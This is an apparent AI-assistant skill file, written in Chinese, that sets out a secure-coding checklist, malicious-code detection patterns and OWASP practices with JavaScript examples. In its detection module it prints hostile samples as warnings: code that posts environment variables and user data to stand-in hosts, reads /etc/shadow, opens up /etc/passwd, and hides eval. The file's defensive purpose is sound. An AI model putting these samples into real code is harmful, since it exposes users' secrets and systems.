---
name: code-security-check
description: >
  代码安全检查技能 — 杰克专用的安全扫描工具。
  涵盖：A) 代码安全检查清单 B) 恶意代码检测 C) 安全编程规范
  适用场景：
  - 写完代码后，进行安全检查
  - 审查第三方代码
  - 学习安全编程知识
  触发时机：任何代码写入操作完成后。
  这是给 Claude 自己用的安全检查工具，不是 OpenClaw 技能。
---

# 代码安全检查 (Code Security Check)

> **原则**：安全无小事，预防胜于治疗！
>
> **目标**：让每一行代码都经得起安全审查！

---

## 📋 三大检查模块

```
┌─────────────────────────────────────────────────────────┐
│  Module A: 代码安全检查清单                              │
│  → 每次写代码后必须过的检查表                            │
├─────────────────────────────────────────────────────────┤
│  Module B: 恶意代码检测                                  │
│  → 识别可疑代码模式，防止无心之失                        │
├─────────────────────────────────────────────────────────┤
│  Module C: 安全编程规范                                  │
│  → OWASP Top 10 + 安全编码最佳实践                       │
└─────────────────────────────────────────────────────────┘
```

---

## 🔒 Module A: 代码安全检查清单

### A1. 敏感信息检查

**检查项**：
- [ ] 有硬编码的密码吗？
- [ ] 有硬编码的 API 密钥吗？
- [ ] 有硬编码的 Token 吗？
- [ ] 有硬编码的数据库连接字符串吗？
- [ ] 有写死的私人信息（邮箱、手机号）吗？

**危险信号**：
```javascript
// ❌ 危险
const password = "admin123";
const apiKey = "sk-1234567890abcdef";
const dbUrl = "mysql://root:password@localhost/mydb";

// ✅ 安全
const password = process.env.DB_PASSWORD;
const apiKey = process.env.API_KEY;
const dbUrl = process.env.DATABASE_URL;
```

---

### A2. 注入漏洞检查

**SQL 注入**：
- [ ] 有字符串拼接 SQL 吗？
- [ ] 用户输入直接进入查询吗？
- [ ] 用了参数化查询吗？

```javascript
// ❌ 危险 - SQL 注入
const sql = `SELECT * FROM users WHERE id = ${userId}`;
db.query(sql);

// ✅ 安全 - 参数化查询
const sql = 'SELECT * FROM users WHERE id = ?';
db.query(sql, [userId]);
```

**命令注入**：
- [ ] 有字符串拼接 shell 命令吗？
- [ ] 用户输入直接进 exec 吗？
- [ ] 用了安全的 API 吗？

```javascript
// ❌ 危险 - 命令注入
const filename = userInput;
exec(`cat ${filename}`);

// ✅ 安全 - 使用 API
const filename = userInput;
fs.readFile(filename, callback);
```

**XSS（跨站脚本）**：
- [ ] 用户输入直接输出到 HTML 吗？
- [ ] 有用 innerHTML 吗？
- [ ] 有转义特殊字符吗？

```javascript
// ❌ 危险 - XSS
element.innerHTML = userInput;

// ✅ 安全 - 转义或使用 textContent
element.textContent = userInput;
// 或使用转义函数
element.innerHTML = escapeHtml(userInput);
```

---

### A3. 路径遍历检查

**检查项**：
- [ ] 用户输入直接用于文件路径吗？
- [ ] 有验证文件在允许的目录内吗？
- [ ] 有处理 ../ 攻击吗？

```javascript
// ❌ 危险 - 路径遍历
const filePath = `/uploads/${userFilename}`;
fs.readFile(filePath);

// ✅ 安全 - 验证路径
const safePath = path.resolve('/uploads', path.basename(userFilename));
if (!safePath.startsWith('/uploads/')) throw new Error('Invalid path');
fs.readFile(safePath);
```

---

### A4. 认证授权检查

**检查项**：
- [ ] 有验证用户身份吗？
- [ ] 有检查用户权限吗？
- [ ] Token 验证了吗？
- [ ] Session 过期时间设置了吗？

```javascript
// ❌ 危险 - 无认证
function getUserData(userId) {
  return db.query('SELECT * FROM users WHERE id = ?', [userId]);
}

// ✅ 安全 - 验证身份和权限
function getUserData(currentUserId, targetUserId) {
  if (currentUserId !== targetUserId) {
    throw new Error('无权访问');
  }
  return db.query('SELECT * FROM users WHERE id = ?', [targetUserId]);
}
```

---

### A5. 数据验证检查

**检查项**：
- [ ] 所有用户输入都验证了吗？
- [ ] 有类型检查吗？
- [ ] 有长度限制吗？
- [ ] 有格式验证吗（邮箱、手机号）？

```javascript
// ❌ 危险 - 无验证
function createUser(data) {
  return db.insert('users', data);
}

// ✅ 安全 - 全面验证
function createUser(data) {
  // 类型检查
  if (typeof data.username !== 'string') throw new Error('用户名必须是字符串');

  // 长度限制
  if (data.username.length > 50) throw new Error('用户名太长');

  // 格式验证
  if (!isValidEmail(data.email)) throw new Error('邮箱格式错误');

  // 白名单过滤
  const allowedFields = ['username', 'email', 'password'];
  const sanitized = Object.keys(data)
    .filter(k => allowedFields.includes(k))
    .reduce((obj, k) => ({ ...obj, [k]: data[k] }), {});

  return db.insert('users', sanitized);
}
```

---

### A6. 错误处理检查

**检查项**：
- [ ] 有捕获异常吗？
- [ ] 错误信息会暴露敏感信息吗？
- [ ] 有日志记录吗？
- [ ] 有统一的错误响应格式吗？

```javascript
// ❌ 危险 - 暴露敏感信息
try {
  db.query(sql);
} catch (e) {
  res.send(`数据库错误：${e.message} - SQL: ${sql}`);
}

// ✅ 安全 - 隐藏敏感信息
try {
  db.query(sql);
} catch (e) {
  logger.error('数据库查询失败', { error: e.message, userId });
  res.status(500).json({ error: 'INTERNAL_ERROR', message: '服务器内部错误' });
}
```

---

### A7. 日志安全檢查

**检查项**：
- [ ] 日志里有密码吗？
- [ ] 日志里有 Token 吗？
- [ ] 日志里有完整信用卡号吗？
- [ ] 日志里有身份证号吗？

```javascript
// ❌ 危险 - 记录敏感信息
logger.info('用户登录', { password: user.password, token });

// ✅ 安全 - 脱敏记录
logger.info('用户登录', { userId: user.id, timestamp: Date.now() });
```

---

### A8. 依赖安全检查

**检查项**：
- [ ] 依赖都是官方源吗？
- [ ] 有严重漏洞的依赖吗？
- [ ] 依赖版本锁定了吗？

```bash
# 检查漏洞
npm audit
npx audit-ci

# 检查过时的依赖
npm outdated

# 锁定版本
package-lock.json / yarn.lock 必须提交
```

---

### A9. 文件上传检查

**检查项**：
- [ ] 有验证文件类型吗？
- [ ] 有大小限制吗？
- [ ] 文件名安全处理了吗？
- [ ] 存储目录可执行脚本吗？

```javascript
// ❌ 危险 - 无验证
app.post('/upload', (req, res) => {
  const file = req.files.file;
  file.mv(`/uploads/${file.name}`);
});

// ✅ 安全 - 全面检查
app.post('/upload', (req, res) => {
  const file = req.files.file;

  // 检查文件类型（白名单）
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (!allowedTypes.includes(file.mimetype)) {
    return res.status(400).json({ error: '不支持的文件类型' });
  }

  // 检查文件大小（10MB 限制）
  if (file.size > 10 * 1024 * 1024) {
    return res.status(400).json({ error: '文件太大' });
  }

  // 安全文件名
  const safeName = `${Date.now()}-${path.basename(file.name)}`;
  const uploadPath = path.resolve('/uploads/images', safeName);

  file.mv(uploadPath);
});
```

---

### A10. API 安全检查

**检查项**：
- [ ] 有速率限制吗？
- [ ] 有 CORS 配置吗？
- [ ] 有请求体大小限制吗？
- [ ] 有输入验证吗？

```javascript
// ✅ 安全配置
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 100 // 最多 100 个请求
}));

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS,
  credentials: true
}));

app.use(express.json({ limit: '10mb' }));
```

---

## 🚨 Module B: 恶意代码检测

### B1. 可疑的外部请求

**检测模式**：
```javascript
// ⚠️ 警惕 - 隐藏的数据外发
fetch('http://unknown-server.com/log', {
  method: 'POST',
  body: JSON.stringify(userData)
});

// ⚠️ 警惕 - 奇怪的 API 调用
const response = await axios.post('http://xxx.com/collect', {
  env: process.env,
  files: fs.readdirSync('/')
});
```

**检查清单**：
- [ ] 有请求到不明域名吗？
- [ ] 有发送敏感数据到外部吗？
- [ ] 域名是硬编码的吗？
- [ ] 请求是必要的吗？

---

### B2. 危险的执行函数

**检测模式**：
```javascript
// ⚠️ 危险 - eval
eval(userInput);

// ⚠️ 危险 - Function 构造
new Function(userInput)();

// ⚠️ 危险 - child_process
exec(userInput);
spawn(userInput, { shell: true });

// ⚠️ 危险 - vm 模块
vm.runInNewContext(userInput);
```

**检查清单**：
- [ ] 有使用 eval 吗？
- [ ] 有使用 Function 构造器吗？
- [ ] 有执行 shell 命令吗？
- [ ] 用户输入能影响执行内容吗？

---

### B3. 隐藏的定时逻辑

**检测模式**：
```javascript
// ⚠️ 警惕 - 延迟执行的可疑代码
setTimeout(() => {
  sendUserDataToExternalServer();
}, 60000);

// ⚠️ 警惕 - 条件触发的隐藏逻辑
if (new Date().getHours() === 3) {
  executeHiddenTask();
}
```

**检查清单**：
- [ ] 有 setTimeout/setInterval 吗？
- [ ] 有基于时间的条件逻辑吗？
- [ ] 有隐藏的回调函数吗？
- [ ] 逻辑的目的是什么？

---

### B4. 异常的权限请求

**检测模式**：
```javascript
// ⚠️ 警惕 - 请求过高权限
fs.chmod('/etc/passwd', 0o777);
process.setuid(0);

// ⚠️ 警惕 - 访问敏感路径
fs.readFileSync('/etc/shadow');
fs.readdirSync('C:/Windows/System32');
```

**检查清单**：
- [ ] 有修改系统文件吗？
- [ ] 有访问敏感目录吗？
- [ ] 有提升权限吗？
- [ ] 权限是必要的吗？

---

### B5. 数据混淆检测

**检测模式**：
```javascript
// ⚠️ 警惕 - Base64 编码的可疑数据
const payload = Buffer.from('c2VjcmV0IGRhdGE=', 'base64').toString();

// ⚠️ 警惕 - 十六进制编码
const code = Buffer.from('636f6e736f6c652e6c6f67282768656c6c6f2729', 'hex').toString();

// ⚠️ 警惕 - 字符串拆分绕过检测
const fn = 'ev'.split('').reverse().join('');
window[fn](maliciousCode);
```

**检查清单**：
- [ ] 有 Base64 编码的字符串吗？
- [ ] 有十六进制编码吗？
- [ ] 有动态拼接函数名吗？
- [ ] 解码后的内容是什么？

---

### B6. 原型污染检测

**检测模式**：
```javascript
// ⚠️ 危险 - 直接合并用户输入
Object.assign(target, userInput);

// ⚠️ 危险 - 深度合并无保护
_.merge(target, userInput);

// ✅ 安全 - 使用 Object.create(null)
const safeObj = Object.create(null);
```

**检查清单**：
- [ ] 有合并用户输入吗？
- [ ] 有验证 __proto__ 吗？
- [ ] 使用了安全的库吗？

---

### B7. 反序列化漏洞

**检测模式**：
```javascript
// ⚠️ 危险 - 反序列化用户数据
const obj = JSON.parse(userInput);
// 在某些库中可能触发原型污染

// ⚠️ 危险 - 使用不安全的反序列化
deserialize(userInput);
```

**检查清单**：
- [ ] 有反序列化用户输入吗？
- [ ] 使用了安全的反序列化库吗？
- [ ] 有验证反序列化结果吗？

---

## 📚 Module C: 安全编程规范

### C1. OWASP Top 10 防护

#### 1. 注入 (Injection)
```
风险：SQL、NoSQL、OS 命令、LDAP 注入
防护：
- 使用参数化查询
- 使用 ORM
- 输入验证和转义
- 最小权限原则
```

#### 2. 失效的身份认证 (Broken Authentication)
```
风险：会话固定、凭证填充、暴力破解
防护：
- 强密码策略
- 多因素认证
- 会话超时
- 失败次数限制
```

#### 3. 敏感数据泄露 (Sensitive Data Exposure)
```
风险：明文存储密码、传输未加密
防护：
- 加密存储（bcrypt、argon2）
- HTTPS 传输
- 不记录敏感信息
- 数据脱敏
```

#### 4. XML 外部实体 (XXE)
```
风险：读取本地文件、SSRF、DoS
防护：
- 禁用 DTD
- 禁用外部实体
- 使用 JSON 替代 XML
```

#### 5. 失效的访问控制 (Broken Access Control)
```
风险：越权访问、目录遍历
防护：
- 服务端权限验证
- 最小权限原则
- 统一的访问控制层
```

#### 6. 安全配置错误 (Security Misconfiguration)
```
风险：默认配置、详细错误信息、未使用功能
防护：
- 删除默认账户
- 关闭详细错误
- 禁用未使用功能
- 定期安全扫描
```

#### 7. 跨站脚本 (XSS)
```
风险：窃取会话、重定向、键盘记录
防护：
- 输出编码
- Content-Security-Policy
- 使用框架的自动转义
- HttpOnly Cookie
```

#### 8. 不安全的反序列化 (Insecure Deserialization)
```
风险：远程代码执行、权限提升
防护：
- 避免反序列化用户数据
- 使用签名验证完整性
- 限制反序列化的类
```

#### 9. 使用含有漏洞的组件 (Vulnerable Components)
```
风险：已知漏洞被利用
防护：
- 定期更新依赖
- 使用 SCA 工具扫描
- 移除不必要的依赖
```

#### 10. 不足的日志记录和监控 (Insufficient Logging & Monitoring)
```
风险：攻击无法追溯、响应延迟
防护：
- 记录所有安全事件
- 设置告警阈值
- 定期审计日志
- 与 SIEM 集成
```

---

### C2. 安全编码最佳实践

#### 密码存储
```javascript
// ✅ 使用 bcrypt
const bcrypt = require('bcrypt');
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);
const valid = await bcrypt.compare(password, hash);

// ❌ 禁止
const hash = md5(password);  // 太弱
const hash = sha256(password);  // 无盐，太弱
```

#### Token 生成
```javascript
// ✅ 使用 crypto 生成安全随机数
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');

// ❌ 禁止
const token = Math.random().toString();  // 可预测
const token = 'fixed-token';  // 硬编码
```

#### HTTPS 配置
```javascript
// ✅ 强制 HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

// ✅ HSTS
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
```

#### Cookie 安全
```javascript
// ✅ 安全配置
res.cookie('session', token, {
  httpOnly: true,      // 禁止 JS 访问
  secure: true,        // 仅 HTTPS
  sameSite: 'strict',  // 防止 CSRF
  maxAge: 3600000      // 1 小时过期
});

// ❌ 危险
res.cookie('session', token);  // 所有保护都没有
```

---

### C3. 安全检查速查表

**写代码前**：
- [ ] 这个功能有什么安全风险？
- [ ] 用户输入在哪里？
- [ ] 敏感数据有哪些？

**写代码时**：
- [ ] 用了参数化查询吗？
- [ ] 输入验证了吗？
- [ ] 错误会暴露敏感信息吗？
- [ ] 日志记录安全吗？

**写代码后**：
- [ ] 过一遍 Module A 检查清单
- [ ] 过一遍 Module B 恶意检测
- [ ] 对照 Module C 最佳实践

**上线前**：
- [ ] npm audit 扫描依赖
- [ ] 渗透测试
- [ ] 代码审查
- [ ] 安全扫描工具

---

## 🛠️ 使用流程

### 场景 1：写完代码后自检

```
1. 运行 Module A 检查清单（逐项对照）
   ↓
2. 运行 Module B 恶意检测（排查可疑模式）
   ↓
3. 发现问题 → 修复 → 重新检查
   ↓
4. 全部通过 → 提交代码
```

### 场景 2：审查第三方代码

```
1. 先运行 Module B 恶意检测（排除明显危险）
   ↓
2. 再运行 Module A 检查清单（逐项审查）
   ↓
3. 对照 Module C 评估安全水平
   ↓
4. 输出审查报告 + 修复建议
```

### 场景 3：学习安全编程

```
1. 阅读 Module C 安全规范
   ↓
2. 理解每个风险点的原理
   ↓
3. 在 Module A/B 中找到对应检查项
   ↓
4. 在实际代码中练习
```

---

## 📊 安全等级分类

| 等级 | 标识 | 含义 | 行动 |
|------|------|------|------|
| Critical | 🔴 | 严重漏洞，立即修复 | 停止所有工作，立刻修复 |
| High | 🟠 | 高风险，需要关注 | 尽快修复，不能上线 |
| Medium | 🟡 | 中等风险，建议修复 | 排期修复 |
| Low | 🟢 | 低风险，可接受 | 记录，后续优化 |

---

## 📝 安全检查报告模板

```markdown
# 代码安全检查报告

**日期**: YYYY-MM-DD
**审查人**: 杰克
**审查范围**: [文件/模块列表]

## 发现的问题

### 🔴 Critical (0 个)

### 🟠 High (0 个)

### 🟡 Medium (0 个)

### 🟢 Low (0 个)

## 整体评估

**安全评分**: X/100

**主要风险**:
- ...

**修复建议**:
1. ...
2. ...

## 结论

- [ ] 可以上线
- [ ] 需要修复后上线
- [ ] 需要重大修改
```

---

## 🔗 相关文件

| 文件 | 作用 |
|------|------|
| [SKILL.md](../code-quality-workflow/SKILL.md) | 代码质量工作流（包含安全铁律） |
| [bug-lessons.md](../code-quality-workflow/bug-lessons.md) | Bug 教训记录 |
| [tech-error-log/](../tech-error-log/SKILL.md) | 技术错误日志 |

---

## 💡 使用示例

### 示例：用户登录功能安全检查

**代码**：
```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // 检查 1: 输入验证
  if (!username || !password) {
    return res.status(400).json({ error: '缺少用户名或密码' });
  }

  // 检查 2: SQL 查询
  const user = await db.query(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );

  if (!user) {
    return res.status(401).json({ error: '用户名或密码错误' });
  }

  // 检查 3: 密码验证
  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: '用户名或密码错误' });
  }

  // 检查 4: 生成 Token
  const token = crypto.randomBytes(32).toString('hex');

  // 检查 5: 记录日志（不记录密码）
  logger.info('用户登录成功', { userId: user.id, ip: req.ip });

  // 检查 6: 返回结果（不返回敏感信息）
  res.json({
    token,
    user: { id: user.id, username: user.username }
  });
});
```

**检查结果**：
```
✅ 输入验证 - 通过
✅ SQL 参数化 - 通过
✅ 密码 bcrypt - 通过
✅ Token 安全随机 - 通过
✅ 日志脱敏 - 通过
✅ 响应脱敏 - 通过

安全评分：100/100
```

---

*版本：1.0 | 创建日期：2026-03-09 | 使用者：杰克（Claude）*

---

## 📜 杰克安全承诺

> 1. **不写危险代码** — 每一行都经得起审查
> 2. **不存敏感信息** — 密码、密钥永远不硬编码
> 3. **不忽视输入验证** — 所有用户输入都是不可信的
> 4. **不暴露错误细节** — 错误信息不泄露系统信息
> 5. **不跳过安全检查** — Module A/B/C 每次都过
>
> **安全，是对用户负责，也是对自己负责！**

---

*安全编程，从每一行代码开始！🔒*
